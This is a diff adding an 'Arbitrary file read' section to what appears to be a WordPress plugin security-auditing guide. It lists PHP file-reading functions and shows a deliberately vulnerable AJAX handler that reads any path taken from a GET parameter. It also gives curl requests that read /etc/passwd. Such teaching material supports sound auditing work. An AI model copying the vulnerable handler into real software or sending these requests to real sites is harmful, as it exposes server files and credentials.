@@ -2674,8 +2674,60 @@ function delete_media_upload($request){
 curl -u <url>/myplugin/v1/deletemedia -H "Content-Type: application/json" -d '{"media":{"file":"/etc/passwd"}'
 ```
 
+----------------
 
+### Arbitrary file read
 
+-----------------
+
+- This include improper file fetching handling in a plugin that can be used to read local files on the server.
+
+- Useful php functions-:
+
+```php
+file_get_contents();
+readfile()
+fopen()
+fread()
+fgets()
+fgetcsv()
+fgetsss() deprecated from PHP 7.3
+file
+cURL
+```
+
+- Wordpress related -:
+
+```
+Wp_Filesystem_Direct::get_contents();
+Wp_Filesystem_Direct::get_contents_array();
+```
+
+- Vulnerable Code-:
+
+```php
+add_action("wp_ajax_get_file", "ajax_get_file");
+
+public function ajax_get_file(){
+    global $wp_filesystem;
+
+    // Make sure that the above variable is properly setup.
+    require_once ABSPATH . 'wp-admin/includes/file.php';
+    WP_Filesystem();
+
+    $url = $_GET["url"];
+    $data = $wp_filesystem->get_contents($url);
+    $data = json_encode( $data );
+    echo $data;
+    die();
+}
+```
+
+- Exploiting it-:A request will be made to `/wp-admin/admin-ajax.php?action=get_file
+
+```bash
+curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file&url=/etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
+```
 
 
 
